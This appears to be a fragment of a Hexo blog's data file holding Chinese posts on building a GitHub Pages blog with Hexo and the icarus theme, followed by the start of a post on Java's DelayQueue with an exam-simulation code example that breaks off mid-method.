<strong>icarus</strong>&#xFF0C;&#x5BF9;&#x6BD4;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#xFF0C;&#x6211;&#x5728;&#x5C55;&#x793A;&#x7EC6;&#x8282;&#x4E0A;&#x505A;&#x4E86;&#x4E00;&#x4E9B;&#x81EA;&#x5DF1;&#x7684;&#x4FEE;&#x6539;&#x3002;</p>\n<p>&#x6BD4;&#x5982;&#x9875;&#x9762;&#x5C55;&#x793A;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x5DE6;&#x4E2D;&#x53F3;&#x4E09;&#x4E2A;&#x533A;&#x57DF;&#xFF0C;&#x5206;&#x522B;&#x4E3A;profile-column&#xFF0C;main-column&#x548C;sidebar-column&#x3002;<br>&#x6E90;&#x4EE3;&#x7801;&#x4E09;&#x8005;&#x5BBD;&#x5EA6;&#x6BD4;&#x4F8B;&#x4E3A;3:7:3&#x3002;&#x4E3A;&#x4E86;&#x7A81;&#x51FA;&#x6B63;&#x6587;&#xFF0C;&#x6211;&#x6539;&#x4E3A;&#x4E86; 2.3&#xFF1A;8.4&#xFF1A;2.3&#x3002;<br>&#x6E90;&#x4EE3;&#x7801;&#x6587;&#x4EF6;&#x4F4D;&#x7F6E;&#x4E3A;&#xFF1A;icarus\\source\\css_variables.styl</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Github+Hexo,%E6%90%AD%E5%BB%BA%E4%B8%93%E6%9C%89%E5%8D%9A%E5%AE%A2/3.png\" alt=\"\"></p>\n<hr>\n<h3 id=\"&#x6587;&#x7AE0;&#x76EE;&#x5F55;\"><a href=\"#&#x6587;&#x7AE0;&#x76EE;&#x5F55;\" class=\"headerlink\" title=\"&#x6587;&#x7AE0;&#x76EE;&#x5F55;\"></a>&#x6587;&#x7AE0;&#x76EE;&#x5F55;</h3><p>icarus&#x4E3B;&#x9898;&#x6A21;&#x677F;&#x7684;&#x6587;&#x7AE0;&#x8BE6;&#x7EC6;&#x5C55;&#x793A;&#x9ED8;&#x8BA4;&#x662F;&#x4E0D;&#x5E26;&#x6709;&#x6587;&#x7AE0;&#x76EE;&#x5F55;&#x7684;<br>&#x5982;&#x679C;&#x9700;&#x8981;&#x6DFB;&#x52A0;&#x6587;&#x7AE0;&#x76EE;&#x5F55;&#xFF0C;&#x53EF;&#x4EE5;&#x53C2;&#x8003;<a href=\"http://www.jianshu.com/p/72408c410904\" target=\"_blank\" rel=\"external\">http://www.jianshu.com/p/72408c410904</a></p>\n<p>icarus&#x4E3B;&#x9898;&#x6DFB;&#x52A0;&#x6587;&#x7AE0;&#x76EE;&#x5F55;&#xFF0C;&#x4FEE;&#x6539;themes\\icarus\\layout\\common\\article.ejs&#x6587;&#x4EF6;&#x5373;&#x53EF;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;% <span class=\"keyword\">if</span> (!index &amp;&amp; post.toc) { %&gt;</span><br><span class=\"line\">&#x4FEE;&#x6539;&#x4E3A;</span><br><span class=\"line\">&lt;% <span class=\"keyword\">if</span> (!index &amp;&amp; post.toc != <span class=\"literal\">false</span>) { %&gt;</span><br></pre></td></tr></table></figure></p>\n<p>&#x6BCF;&#x7BC7;&#x6587;&#x7AE0;&#x53EF;&#x4EE5;&#x9009;&#x62E9;&#x662F;&#x5426;&#x5F00;&#x653E;&#x76EE;&#x5F55;&#x529F;&#x80FD;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">title: Github+Hexo,&#x642D;&#x5EFA;&#x4E13;&#x5C5E;&#x7F51;&#x7AD9;</span><br><span class=\"line\">categories:</span><br><span class=\"line\">  - demo</span><br><span class=\"line\">toc: <span class=\"literal\">false</span></span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure></p>\n","excerpt":"<h3 id=\"&#x524D;&#x8A00;\"><a href=\"#&#x524D;&#x8A00;\" class=\"headerlink\" title=\"&#x524D;&#x8A00;\"></a>&#x524D;&#x8A00;</h3><p>&#x8BB0;&#x5F97;&#x4ECE;&#x5927;&#x4E8C;&#x5F00;&#x59CB;&#xFF0C;&#x5C31;&#x4E00;&#x76F4;&#x60F3;&#x642D;&#x4E2A;&#x4E13;&#x5C5E;&#x7F51;&#x7AD9;&#xFF0C;&#x5F53;&#x65F6;&#x4F7F;&#x52B2;&#x62A0;&#x9875;&#x9762;&#x3010;&#x524D;&#x7AEF;&#x9875;&#x9762;&#x662F;&#x4ECE;QQ&#x7A7A;&#x95F4;&#x62A0;&#x7684;&#xFF0C;&#x73B0;&#x5728;&#x60F3;&#x62A0;&#x4F30;&#x8BA1;&#x6CA1;&#x8FD9;&#x4E48;&#x5BB9;&#x6613;&#x4E86;&#x3011;&#xFF0C;&#x5199;&#x4EE3;&#x7801;&#xFF0C;&#x5FD9;&#x6D3B;&#x534A;&#x5929;&#x624D;&#x628A;&#x7A0B;&#x5E8F;&#x5F04;&#x597D;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Github+Hexo,%E6%90%AD%E5%BB%BA%E4%B8%93%E6%9C%89%E5%8D%9A%E5%AE%A2/2.png\" alt=\"&#x4E2A;&#x4EBA;&#x7F51;&#x7AD9;\"></p>\n<p>&#x53EF;&#x60DC;&#x6700;&#x7EC8;&#x9879;&#x76EE;&#x8FD8;&#x662F;&#x6CA1;&#x4E0A;&#x7EBF;&#xFF0C;&#x56E0;&#x4E3A;&#x5F53;&#x65F6;&#x6709;&#x4E24;&#x95EE;&#x9898;&#x7ED5;&#x4E0D;&#x5F00;</p>\n<ul>\n<li>&#x9700;&#x8981;&#x8D2D;&#x4E70;&#x670D;&#x52A1;&#x5668;&#x3010;&#x670D;&#x52A1;&#x5668;&#x592A;&#x8D35;&#xFF0C;&#x73B0;&#x5728;&#x4FBF;&#x5B9C;&#x7684;&#x963F;&#x91CC;&#x4E91;&#x670D;&#x52A1;&#x5668;&#x6BCF;&#x6708;&#x90FD;&#x9700;100&#x5DE6;&#x53F3;&#x3011;&#x3002;</li>\n<li>&#x9700;&#x8981;&#x8FD0;&#x7EF4;&#x7BA1;&#x7406;&#x3010;&#x9EBB;&#x70E6;&#x4E14;&#x5371;&#x9669;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x5B95;&#x4E86;&#x53EF;&#x80FD;&#x4E22;&#x5931;&#x6570;&#x636E;&#x3011;&#x3002;</li>\n</ul>\n<p>&#x6700;&#x8FD1;&#x4E86;&#x89E3;&#x5230; github + hexo &#x80FD;&#x5B8C;&#x7F8E;&#x89E3;&#x51B3;&#x4E0A;&#x8FF0;&#x95EE;&#x9898;&#xFF0C;&#x5565;&#x4E5F;&#x4E0D;&#x8BF4;&#x4E86;&#xFF0C;&#x76F4;&#x63A5;&#x5F00;&#x5E72; ^.^</p>\n<hr>\n<h3 id=\"&#x76F8;&#x5173;&#x7F51;&#x7AD9;\"><a href=\"#&#x76F8;&#x5173;&#x7F51;&#x7AD9;\" class=\"headerlink\" title=\"&#x76F8;&#x5173;&#x7F51;&#x7AD9;\"></a>&#x76F8;&#x5173;&#x7F51;&#x7AD9;</h3><p>&#x642D;&#x5EFA;&#x6559;&#x7A0B;&#x7F51;&#x4E0A;&#x6BD4;&#x6BD4;&#x7686;&#x662F;&#xFF0C;&#x6B64;&#x5904;&#x4E0D;&#x7D2F;&#x8D58;&#xFF0C;&#x4E0B;&#x9762;&#x662F;&#x642D;&#x5EFA;&#x8FC7;&#x7A0B;&#x4E2D;&#x7528;&#x5230;&#x7684;&#x76F8;&#x5173;&#x7F51;&#x7AD9;&#xFF1A;</p>\n<p>hexo&#x4E2D;&#x6587;&#x7F51;&#x7AD9;&#xFF1A;<a href=\"https://hexo.io/zh-cn/docs/\">https://hexo.io/zh-cn/docs/</a><br>hexo&#x4E3B;&#x9898;&#x6A21;&#x677F;&#xFF1A;<a href=\"https://www.zhihu.com/question/24422335\">https://www.zhihu.com/question/24422335</a><br>hexo+github&#x642D;&#x5EFA;&#x8FC7;&#x7A0B;&#xFF1A;<a href=\"http://www.jianshu.com/p/df3edc4286d2\">http://www.jianshu.com/p/df3edc4286d2</a><br>Markdown &#x8BED;&#x6CD5;&#x8BF4;&#x660E;&#xFF1A;<a href=\"http://www.appinn.com/markdown/\">http://www.appinn.com/markdown/</a><br>github&#x7ED1;&#x5B9A;&#x57DF;&#x540D;&#xFF1A;<a href=\"http://www.jianshu.com/p/1d427e888dda\">http://www.jianshu.com/p/1d427e888dda</a>  </p>\n<hr>\n<h3 id=\"HEXO&#x5982;&#x4F55;&#x4F18;&#x5316;&#x90E8;&#x7F72;&#x53CA;&#x7BA1;&#x7406;\"><a href=\"#HEXO&#x5982;&#x4F55;&#x4F18;&#x5316;&#x90E8;&#x7F72;&#x53CA;&#x7BA1;&#x7406;\" class=\"headerlink\" title=\"HEXO&#x5982;&#x4F55;&#x4F18;&#x5316;&#x90E8;&#x7F72;&#x53CA;&#x7BA1;&#x7406;\"></a>HEXO&#x5982;&#x4F55;&#x4F18;&#x5316;&#x90E8;&#x7F72;&#x53CA;&#x7BA1;&#x7406;</h3><p><strong>&#x95EE;&#x9898;&#xFF1A;&#x4F7F;&#x7528;hexo&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x4E22;&#x5931;&#x6216;&#x8005;&#x60F3;&#x5728;&#x5176;&#x4ED6;&#x7535;&#x8111;&#x4E0A;&#x4FEE;&#x6539;&#x535A;&#x5BA2;&#x600E;&#x4E48;&#x529E;&#xFF1F;</strong><br><strong>&#x65B9;&#x6848;&#xFF1A;</strong>&#x7B80;&#x5355;&#x5730;&#x8BF4;&#xFF0C;&#x6BCF;&#x4E2A;&#x60F3;&#x5EFA;&#x7ACB;GitHub Pages&#x7684;&#x4ED3;&#x5E93;&#xFF0C;&#x81F3;&#x5C11;&#x4E24;&#x4E2A;&#x5206;&#x652F;&#xFF0C;&#x4E00;&#x4E2A;hexo&#x5206;&#x652F;&#x7528;&#x6765;&#x5B58;&#x653E;&#x7F51;&#x7AD9;&#x7684;&#x539F;&#x59CB;&#x6587;&#x4EF6;&#xFF0C;&#x4E00;&#x4E2A;master&#x5206;&#x652F;&#x7528;&#x6765;&#x5B58;&#x653E;&#x751F;&#x6210;&#x7684;&#x9759;&#x6001;&#x7F51;&#x9875;&#x3002;  </p>","more":"<p><strong>&#x6B65;&#x9AA4;&#x5982;&#x4E0B;:</strong><br>1&#x3001;&#x521B;&#x5EFA;&#x4ED3;&#x5E93;&#xFF0C;Wasim37.github.io&#xFF1B;<br>2&#x3001;&#x521B;&#x5EFA;&#x4E24;&#x4E2A;&#x5206;&#x652F;&#xFF1A;master &#x4E0E; hexo&#xFF1B;<br>3&#x3001;&#x8BBE;&#x7F6E;hexo&#x4E3A;&#x9ED8;&#x8BA4;&#x5206;&#x652F;&#xFF08;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x624B;&#x52A8;&#x7BA1;&#x7406;&#x8FD9;&#x4E2A;&#x5206;&#x652F;&#x4E0A;&#x7684;Hexo&#x7F51;&#x7AD9;&#x6587;&#x4EF6;&#xFF09;&#xFF1B;<br>4&#x3001;&#x4F7F;&#x7528;git clone git@github.com:Wasim37/Wasim37.github.io.git&#x62F7;&#x8D1D;&#x4ED3;&#x5E93;&#xFF1B;<br>5&#x3001;&#x5728;&#x672C;&#x5730;Wasim37.github.io&#x6587;&#x4EF6;&#x5939;&#x4E0B;&#x901A;&#x8FC7;Git bash&#x4F9D;&#x6B21;&#x6267;&#x884C;npm install hexo&#x3001;hexo init&#x3001;npm install &#x548C; npm install hexo-deployer-git&#xFF08;&#x6B64;&#x65F6;&#x5F53;&#x524D;&#x5206;&#x652F;&#x5E94;&#x663E;&#x793A;&#x4E3A;hexo&#xFF09;;<br>6&#x3001;&#x4FEE;&#x6539;_config.yml&#x4E2D;&#x7684;deploy&#x53C2;&#x6570;&#xFF0C;&#x5206;&#x652F;&#x5E94;&#x4E3A;master&#xFF1B;<br>7&#x3001;&#x4F9D;&#x6B21;&#x6267;&#x884C;git add .&#x3001;git commit -m &#x201C;&#x2026;&#x201D;&#x3001;git push origin hexo&#x63D0;&#x4EA4;&#x7F51;&#x7AD9;&#x76F8;&#x5173;&#x7684;&#x6587;&#x4EF6;&#xFF1B;<br>8&#x3001;&#x6267;&#x884C;hexo generate -d&#x751F;&#x6210;&#x7F51;&#x7AD9;&#x5E76;&#x90E8;&#x7F72;&#x5230;GitHub&#x4E0A;&#x3002;</p>\n<p><strong>&#x672C;&#x5730;&#x4FEE;&#x6539;</strong><br>1&#x3001;&#x5728;&#x672C;&#x5730;&#x5BF9;&#x535A;&#x5BA2;&#x8FDB;&#x884C;&#x4FEE;&#x6539;&#xFF08;&#x6DFB;&#x52A0;&#x65B0;&#x535A;&#x6587;&#x3001;&#x4FEE;&#x6539;&#x6837;&#x5F0F;&#x7B49;&#x7B49;&#xFF09;&#x540E;&#xFF0C;&#x901A;&#x8FC7;&#x4E0B;&#x9762;&#x7684;&#x6D41;&#x7A0B;&#x8FDB;&#x884C;&#x7BA1;&#x7406;&#xFF1A;<br>&#x4F9D;&#x6B21;&#x6267;&#x884C;git add .&#x3001;git commit -m &#x201C;&#x2026;&#x201D;&#x3001;git push origin hexo&#x6307;&#x4EE4;&#x5C06;&#x6539;&#x52A8;&#x63A8;&#x9001;&#x5230;GitHub&#xFF08;&#x6B64;&#x65F6;&#x5F53;&#x524D;&#x5206;&#x652F;&#x5E94;&#x4E3A;hexo&#xFF09;&#xFF1B;<br>2&#x3001;&#x7136;&#x540E;&#x624D;&#x6267;&#x884C;hexo generate -d&#x53D1;&#x5E03;&#x7F51;&#x7AD9;&#x5230;master&#x5206;&#x652F;&#x4E0A;&#x3002;</p>\n<p><strong>&#x672C;&#x5730;&#x8D44;&#x6599;&#x4E22;&#x5931;&#x6216;&#x8005;&#x60F3;&#x5728;&#x5176;&#x4ED6;&#x7535;&#x8111;&#x4E0A;&#x4FEE;&#x6539;&#x535A;&#x5BA2;</strong><br>1&#x3001;&#x4F7F;&#x7528;git clone git@github.com:Wasim37/Wasim37.github.io.git&#x62F7;&#x8D1D;&#x4ED3;&#x5E93;&#xFF08;&#x9ED8;&#x8BA4;&#x5206;&#x652F;&#x4E3A;hexo&#xFF09;&#xFF1B;<br>2&#x3001;&#x5728;&#x672C;&#x5730;&#x65B0;&#x62F7;&#x8D1D;&#x7684;Wasim37.github.io&#x6587;&#x4EF6;&#x5939;&#x4E0B;&#x901A;&#x8FC7;Git bash&#x4F9D;&#x6B21;&#x6267;&#x884C;&#x4E0B;&#x5217;&#x6307;&#x4EE4;&#xFF1A;npm install hexo&#x3001;npm install&#x3001;npm install hexo-deployer-git&#xFF08;&#x8BB0;&#x5F97;&#xFF0C;&#x4E0D;&#x9700;&#x8981;hexo init&#x8FD9;&#x6761;&#x6307;&#x4EE4;&#xFF09;&#x3002;</p>\n<hr>\n<h3 id=\"&#x5B89;&#x88C5;&#x9519;&#x8BEF;&#x8BB0;&#x5F55;\"><a href=\"#&#x5B89;&#x88C5;&#x9519;&#x8BEF;&#x8BB0;&#x5F55;\" class=\"headerlink\" title=\"&#x5B89;&#x88C5;&#x9519;&#x8BEF;&#x8BB0;&#x5F55;\"></a>&#x5B89;&#x88C5;&#x9519;&#x8BEF;&#x8BB0;&#x5F55;</h3><p>&#x6267;&#x884C;hexo d&#x51FA;&#x73B0;&#x4EE5;&#x4E0B;&#x9519;&#x8BEF;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Github+Hexo,%E6%90%AD%E5%BB%BA%E4%B8%93%E6%9C%89%E5%8D%9A%E5%AE%A2/4.png\" alt=\"\"></p>\n<p><strong>&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF1A;</strong><br>_config.yml &#x2014;&#x2014;&gt; deploy &#x2014;&#x2014;&gt; repository<br><a href=\"https://github.com/{username}/{username}.github.io.git\">https://github.com/{username}/{username}.github.io.git</a> &#x4FEE;&#x6539;&#x4E3A;<br>git@github.com:{username}/{username}.github.io.git</p>\n<hr>\n<h3 id=\"&#x6587;&#x7AE0;&#x7F16;&#x8F91;&#x5DE5;&#x5177;\"><a href=\"#&#x6587;&#x7AE0;&#x7F16;&#x8F91;&#x5DE5;&#x5177;\" class=\"headerlink\" title=\"&#x6587;&#x7AE0;&#x7F16;&#x8F91;&#x5DE5;&#x5177;\"></a>&#x6587;&#x7AE0;&#x7F16;&#x8F91;&#x5DE5;&#x5177;</h3><p>&#x6587;&#x7AE0;&#x7F16;&#x8F91;&#x5DE5;&#x5177;&#x4E00;&#x5F00;&#x59CB;&#x6211;&#x4F7F;&#x7528;&#x7684;&#x662F;subline&#xFF0C;&#x4F46;&#x56E0;&#x4E3A;&#x6CA1;&#x6709;&#x5FEB;&#x6377;&#x952E;&#x53CA;&#x9884;&#x89C8;&#x529F;&#x80FD;&#xFF0C;&#x540E;&#x6765;&#x9009;&#x62E9;&#x4E86;MarkdownPad&#x3002;&#x53EF;&#x6700;&#x8FD1;&#x53D1;&#x73B0;&#x65B0;&#x7248;&#x7684;&#x6709;&#x9053;&#x4E91;&#x7B14;&#x8BB0;&#x652F;&#x6301;Markdown&#x8BED;&#x6CD5;&#xFF0C;&#x679C;&#x65AD;&#x6362;&#x6210;&#x4E86;&#x6709;&#x9053;&#x3002;<br><strong>&#x56E0;&#x4E3A;&#x6709;&#x9053;&#x9664;&#x4E86;&#x7F16;&#x8F91;&#x529F;&#x80FD;&#xFF0C;&#x6211;&#x66F4;&#x770B;&#x91CD;&#x7684;&#x662F;&#x5B83;&#x5BF9;&#x6587;&#x7AE0;&#x7684;&#x4E8C;&#x6B21;&#x5907;&#x4EFD;.</strong> </p>\n<p>&#x6709;&#x9053;&#x4E91;&#x7B14;&#x8BB0;MarkDown&#x4F7F;&#x7528;&#x6559;&#x7A0B;&#xFF1A; <a href=\"http://note.youdao.com/iyoudao/?p=1895\">http://note.youdao.com/iyoudao/?p=1895</a></p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Github+Hexo,%E6%90%AD%E5%BB%BA%E4%B8%93%E6%9C%89%E5%8D%9A%E5%AE%A2/1.png\" alt=\"&#x6548;&#x679C;&#x56FE;\"></p>\n<p><strong>&#x5176;&#x6B21;&#x6587;&#x7AE0;&#x56FE;&#x7247;&#x5982;&#x679C;&#x4E0D;&#x60F3;&#x6258;&#x7BA1;&#x5728;github&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4E03;&#x725B;&#x4E91;&#x5B58;&#x50A8;&#x7B49;&#x56FE;&#x5E8A;&#x5DE5;&#x5177;&#x3002;</strong></p>\n<hr>\n<h3 id=\"&#x6A21;&#x677F;&#x81EA;&#x5B9A;&#x4E49;\"><a href=\"#&#x6A21;&#x677F;&#x81EA;&#x5B9A;&#x4E49;\" class=\"headerlink\" title=\"&#x6A21;&#x677F;&#x81EA;&#x5B9A;&#x4E49;\"></a>&#x6A21;&#x677F;&#x81EA;&#x5B9A;&#x4E49;</h3><p>&#x6211;&#x4F7F;&#x7528;&#x7684;&#x535A;&#x5BA2;&#x4E3B;&#x9898;&#x4E3A; <strong>icarus</strong>&#xFF0C;&#x5BF9;&#x6BD4;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#xFF0C;&#x6211;&#x5728;&#x5C55;&#x793A;&#x7EC6;&#x8282;&#x4E0A;&#x505A;&#x4E86;&#x4E00;&#x4E9B;&#x81EA;&#x5DF1;&#x7684;&#x4FEE;&#x6539;&#x3002;</p>\n<p>&#x6BD4;&#x5982;&#x9875;&#x9762;&#x5C55;&#x793A;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x5DE6;&#x4E2D;&#x53F3;&#x4E09;&#x4E2A;&#x533A;&#x57DF;&#xFF0C;&#x5206;&#x522B;&#x4E3A;profile-column&#xFF0C;main-column&#x548C;sidebar-column&#x3002;<br>&#x6E90;&#x4EE3;&#x7801;&#x4E09;&#x8005;&#x5BBD;&#x5EA6;&#x6BD4;&#x4F8B;&#x4E3A;3:7:3&#x3002;&#x4E3A;&#x4E86;&#x7A81;&#x51FA;&#x6B63;&#x6587;&#xFF0C;&#x6211;&#x6539;&#x4E3A;&#x4E86; 2.3&#xFF1A;8.4&#xFF1A;2.3&#x3002;<br>&#x6E90;&#x4EE3;&#x7801;&#x6587;&#x4EF6;&#x4F4D;&#x7F6E;&#x4E3A;&#xFF1A;icarus\\source\\css_variables.styl</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Github+Hexo,%E6%90%AD%E5%BB%BA%E4%B8%93%E6%9C%89%E5%8D%9A%E5%AE%A2/3.png\" alt=\"\"></p>\n<hr>\n<h3 id=\"&#x6587;&#x7AE0;&#x76EE;&#x5F55;\"><a href=\"#&#x6587;&#x7AE0;&#x76EE;&#x5F55;\" class=\"headerlink\" title=\"&#x6587;&#x7AE0;&#x76EE;&#x5F55;\"></a>&#x6587;&#x7AE0;&#x76EE;&#x5F55;</h3><p>icarus&#x4E3B;&#x9898;&#x6A21;&#x677F;&#x7684;&#x6587;&#x7AE0;&#x8BE6;&#x7EC6;&#x5C55;&#x793A;&#x9ED8;&#x8BA4;&#x662F;&#x4E0D;&#x5E26;&#x6709;&#x6587;&#x7AE0;&#x76EE;&#x5F55;&#x7684;<br>&#x5982;&#x679C;&#x9700;&#x8981;&#x6DFB;&#x52A0;&#x6587;&#x7AE0;&#x76EE;&#x5F55;&#xFF0C;&#x53EF;&#x4EE5;&#x53C2;&#x8003;<a href=\"http://www.jianshu.com/p/72408c410904\">http://www.jianshu.com/p/72408c410904</a></p>\n<p>icarus&#x4E3B;&#x9898;&#x6DFB;&#x52A0;&#x6587;&#x7AE0;&#x76EE;&#x5F55;&#xFF0C;&#x4FEE;&#x6539;themes\\icarus\\layout\\common\\article.ejs&#x6587;&#x4EF6;&#x5373;&#x53EF;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;% <span class=\"keyword\">if</span> (!index &amp;&amp; post.toc) { %&gt;</span><br><span class=\"line\">&#x4FEE;&#x6539;&#x4E3A;</span><br><span class=\"line\">&lt;% <span class=\"keyword\">if</span> (!index &amp;&amp; post.toc != <span class=\"literal\">false</span>) { %&gt;</span><br></pre></td></tr></table></figure></p>\n<p>&#x6BCF;&#x7BC7;&#x6587;&#x7AE0;&#x53EF;&#x4EE5;&#x9009;&#x62E9;&#x662F;&#x5426;&#x5F00;&#x653E;&#x76EE;&#x5F55;&#x529F;&#x80FD;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">title: Github+Hexo,&#x642D;&#x5EFA;&#x4E13;&#x5C5E;&#x7F51;&#x7AD9;</span><br><span class=\"line\">categories:</span><br><span class=\"line\">  - demo</span><br><span class=\"line\">toc: <span class=\"literal\">false</span></span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure></p>"},{"title":"DelayQueue使用","date":"2016-04-16T15:42:13.000Z","toc":false,"_content":"\n>假设现有如下使用场景：\na) 关闭空闲连接。服务器中，有很多客户端的连接，空闲一段时间之后需要关闭之。 \nb) 缓存。缓存中的对象，超过了空闲时间，需要从缓存中移出。\nc) 任务超时处理。在网络协议滑动窗口请求应答式交互时，处理超时未响应的请求。\n\n笨办法是，使用一个后台线程，遍历所有对象，挨个检查。\n但对象数量过多时，存在性能问题，检查间隔时间不好设置，间隔时间过大，影响精确度，多小则存在效率问题。而且做不到按超时的时间顺序处理。\n\n这场景，使用DelayQueue最适合了。\nDelayed 元素的一个无界阻塞队列，只有在延迟期满时才能从中提取元素。\n该队列的头部是延迟期满后保存时间最长的Delayed元素（即最想优先处理的元素）。如果延迟都还没有期满，则队列没有头部，并且 poll 将返回 null。\n当一个元素的 getDelay(TimeUnit.NANOSECONDS) 方法返回一个小于等于 0 的值时，将发生到期。\n即使无法使用take或poll移除未到期的元素，也不会将这些元素作为正常元素对待。例如，size方法同时返回到期和未到期元素的计数。此队列不允许使 null元素。\n\n<!-- more -->\n\nDelayQueue队列中保存的是实现了Delayed接口的实现类，里面必须实现getDelay()和compareTo()方法。前者用于取DelayQueue里面的元素时判断是否到了延时时间，否则不予获取，是则获取。  compareTo()方法用于进行队列内部的排序。compareTo 方法需提供与 getDelay 方法一致的排序。\n\nDelayQueue = BlockingQueue + PriorityQueue + Delayed\nPriorityBlockingQueue = BlockingQueue + PriorityQueue\nDelayQueue的关键元素BlockingQueue、PriorityQueue、Delayed。\n可以这么说，DelayQueue是一个使用优先队列（PriorityQueue）实现的BlockingQueue，优先队列的比较基准值是时间。通过PriorityQueue，可以优先处理最紧急的元素，利用BlockingQueue，能防止不必要的不断轮询，提高了性能。在很多需要回收对象的场景都能用上。\n\n---\n\n### 代码示例\n\n#### 场景一\n模拟一个考试的日子，考试时间为120分钟，30分钟后才可交卷，当时间到了，或学生都交完卷了考试结束。主要注意的：\n1、考试时间为120分钟，30分钟后才可交卷，初始化考生完成试卷时间最小应为30分钟\n2、对于能够在120分钟内交卷的考生，如何实现这些考生交卷\n3、对于120分钟内没有完成考试的考生，在120分钟考试时间到后需要让他们强制交卷\n4、在所有的考生都交完卷后，需要将控制线程关闭\n\n**下面是自己修改了的代码：**\n```\npackage com.bbk.demo;\n\nimport java.util.Iterator;\nimport java.util.Random;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.DelayQueue;\nimport java.util.concurrent.Delayed;\nimport java.util.concurrent.TimeUnit;\n\n/**\n * DelayQueue\n * @author wasim\n * @project Demo\n * @create at 2015-10-6 下午4:37:31\n */\npublic class Exam {\n\n    public static void main(String[] args) throws InterruptedException {\n        \n        int studentNumber = 20;\n        CountDownLatch countDownLatch = new CountDownLatch(studentNumber+1);\n        DelayQueue< Student> students = new DelayQueue<Student>();\n        Random random = new Random();\n        for (int i = 0; i < studentNumber; i++) {\n            students.put(new Student(\"student\"+(i+1), 30+random.nextInt(120),countDownLatch));\n        }\n        Thread teacherThread =new Thread(new Teacher(students)); \n        students.put(new EndExam(students, 120,countDownLatch,teacherThread));\n        teacherThread.start();\n        countDownLatch.await();\n        System.out.println(\" 考试时间到，全部交卷！\");  \n    }\n\n}\n\nclass Student implements Runnable,Delayed{\n\n    private String name;\n    private long workTime;\n    private long submitTime;\n    private boolean isForce = false;\n    private CountDownLatch countDownLatch;\n    \n    public Student(){}\n    \n    public Student(String name,long workTime,CountDownLatch countDownLatch){\n        this.name = name;\n        this.workTime = workTime;\n        //提交时间 = 当前时间 + 作答时间\n        this.submitTime = TimeUnit.NANOSECONDS.convert(workTime, TimeUnit.NANOSECONDS)+System.nanoTime();\n        this.countDownLatch = countDownLatch;\n    }\n    \n    @Override\n    public int compareTo(Delayed o) {\n        // 按照作答时长正序排序（队头放的是你认为最先需要处理的元素，在这里体现为需要最先交卷，所以是正序）\n        if(o == null || ! (o instanceof Student)) return 1;\n        if(o == this) return 0;\n        Student s = (Student)o;\n        if (this.workTime > s.workTime) {\n            return 1;\n        }else if (this.workTime == s.workTime) {\n            return 0;\n        }else {\n            return -1;\n        }\n    }\n\n    @Override\n    public long getDelay(TimeUnit unit) {\n    \t// 提交时间 - 当前时间  用来判断延迟是否到期（即是否可以提交试卷，可以进行take或者poll）\n        // 返回正数：延迟还有多少时间到期。负数：延迟已经在多长时间前到期。负数代表可以take或者poll\n        return unit.convert(submitTime - System.nanoTime(),  TimeUnit.NANOSECONDS);\n    }\n\n    @Override\n    public void run() {\n        if (isForce) {\n            System.out.println(name + \" 交卷, 希望用时\" + workTime + \"分钟\"+\" ,实际用时 120分钟\" );\n        }else {\n            System.out.println(name + \" 交卷, 希望用时\" + workTime + \"分钟\"+\" ,实际用时 \"+workTime +\" 分钟\");  \n        }\n        countDownLatch.countDown();\n    }\n\n    public boolean isForce() {\n        return isForce;\n    }\n\n    public void setForce(boolean isForce) {\n        this.isForce = isForce;\n    }\n\n\tpublic String getName() {\n\t\treturn name;\n\t}\n\n\tpublic void setName(String name) {\n\t\tthis.name = name;\n\t}\n\n\tpublic long getWorkTime() {\n\t\treturn workTime;\n\t}\n\n\tpublic void setWorkTime(long workTime) {\n\t\tthis.workTime = workTime;\n\t}\n\n\tpublic long getSubmitTime() {\n\t\treturn submitTime;\n\t}\n\n\tpublic void setSubmitTime(long submitTime) {\n\t\tthis.submitTime = submitTime;\n\t}\n    \n}\n\nclass EndExam extends Student{\n\n    private DelayQueue<Student> students;\n    private CountDownLatch countDownLatch;\n    private Thread teacherThread;\n    \n    public EndExam(DelayQueue<Student> students, long workTime, CountDownLatch countDownLatch,Thread teacherThread) {\n        super(\"强制收卷\", workTime,countDownLatch);\n        this.students = students;\n        this.countDownLatch = countDownLatch;\n        this.teacherThread = teacherThread;\n    }\n    \n    \n    \n    @Override\n    public void run() {\n        teacherThread.interrupt();\n        Student tmpStudent;\n        for (Iterator<Student> iterator2 = students.iterator(); iterator2.hasNext();) {\n            tmpStudent = 